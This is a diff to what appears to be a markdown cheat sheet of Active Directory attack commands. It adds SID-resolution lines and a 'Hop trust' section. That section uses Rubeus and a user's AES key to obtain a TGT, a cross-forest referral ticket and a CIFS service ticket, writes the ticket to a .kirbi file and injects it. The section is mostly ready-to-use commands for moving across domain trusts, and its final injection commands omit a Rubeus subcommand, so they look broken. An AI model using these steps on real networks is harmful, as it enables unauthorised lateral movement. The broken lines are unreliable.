@@ -2003,18 +2003,52 @@ SELECT   name,type_desc,is_disabled FROM     master.sys.server_principals  WHERE
 ```
 Find-ForeignGroup -Verbose
 Find-ForeignUser -Verbose
+ConvertFrom-SID <SID>
 ```
 
 #### Enumerate users who are in groups outside of the user’s current domain
 ```
 Get-DomainForeignUser 
+ConvertFrom-SID <SID>
 ```
 
 #### Enumerates group in the target domain that contain users/groups who are not in the target domain.
 ```
 Get-DomainForeignGroupMember -Domain <TARGET DOMAIN FQDN>
+ConvertFrom-SID <SID>
 ```
-
+ 
+### Hop trust
+- Easiest way is to use the username/password to start a new powershell session or do a runas.
+- If you only have the user's RC4/AES keys, we can still request Kerberos tickets with Rubeus but it's more involved. We need an inter-realm key which Rubeus won't produce for us automatically, so we have to do it manually.
+ 
+#### Create TGT
+```
+.\Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap
+```
+ 
+#### Request a referral ticket
+- from the current domain, for the target domain.
+```
+.\Rubeus.exe asktgs /service:krbtgt/<EXTERNAL FQDN> /domain:<FQDN> /dc:<DC FQDN> /ticket:<BASE64 TICKET> /nowrap
+```
+ 
+#### Request TGS
+```
+.\Rubeus.exe asktgs /service:cifs/<EXTERNAL FQDN> /domain:<EXTERNAL FQDN> /dc:<EXTERNAL DC FQDN> /ticket:<BASE64 TICKET> /nowrap
+```
+ 
+#### Write ticket to file
+```
+[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\subsidiary.kirbi", [System.Convert]::FromBase64String("<BASE64 TICKET>"))
+```
+ 
+#### Then inject and use the ticket
+```
+.\Rubeus.exe /ticket:<TICKET BASE64>
+.\Rubeus.exe /ticket:<FILE TO KIRBI FILE>
+```
+ 
 ## ACLS
 - Access to resources in a forest trust can also be provided without using FSPs using ACLs.
 ```
